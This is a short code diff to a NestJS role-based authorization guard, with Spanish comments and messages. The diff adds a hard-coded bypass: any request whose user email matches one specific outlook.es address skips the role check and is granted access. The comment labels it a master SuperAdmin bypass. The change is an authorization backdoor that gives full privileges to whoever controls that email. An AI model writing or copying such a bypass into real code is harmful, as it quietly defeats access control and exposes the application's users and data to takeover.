@@ -17,6 +17,9 @@ export class RolesGuard implements CanActivate {
 
     const { user } = context.switchToHttp().getRequest();
 
+    // Bypass para el correo maestro de SuperAdmin
+    if (user?.email === 'madridsystem@outlook.es') return true;
+
     if (!requiredRoles.includes(user?.role)) {
       throw new ForbiddenException('No tienes permisos para realizar esta acción');
     }
